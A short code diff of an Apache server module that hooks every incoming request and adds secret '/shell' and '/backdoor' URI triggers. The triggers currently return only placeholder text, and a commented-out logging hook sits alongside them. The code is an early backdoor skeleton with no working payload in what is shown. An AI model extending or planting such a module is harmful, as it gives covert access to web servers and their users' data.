@@ -10,21 +10,29 @@ static int backblast_handler(request_rec *r);
 static void register_hooks(apr_pool_t *pool)
 {
    ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
-   //ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
+   // ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
 }
 
 static int winchester_handler(request_rec *r)
 {
-	if (!r->unparsed_uri || strcmp(r->unparsed_uri, "/test.backdoor"))
+	if (!r->unparsed_uri)
     {
-        ap_rprintf(r, "Hooked, but failed if");
-
+        // no uri, pass
+        return OK;
+    }
+    if (strcmp(r->unparsed_uri, "/shell") == 0)
+    {
+        ap_rprintf(r, "Shell dir");
+        return DONE;
+    }
+    if (strcmp(r->unparsed_uri, "/backdoor") == 0)
+    {
+        ap_rprintf(r, "Backdoor dir");
         return DONE;
     }
 
-    ap_rprintf(r, "Hooked post_read");
-
-	return DONE;
+    // didn't hit a backdoor dir, pass
+	return OK;
 }
 
 static int backblast_handler(request_rec *r)
